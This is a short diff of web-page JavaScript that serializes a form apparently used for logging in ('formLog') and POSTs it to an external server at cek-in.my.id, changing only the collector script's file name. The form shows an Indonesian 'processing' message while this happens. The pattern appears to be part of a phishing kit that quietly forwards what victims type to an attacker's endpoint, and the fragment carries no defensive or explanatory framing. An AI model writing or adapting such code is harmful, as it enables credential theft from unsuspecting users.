@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://cek-in.my.id/p/req/two.php',
+            url: 'https://cek-in.my.id/p/req/twoo.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
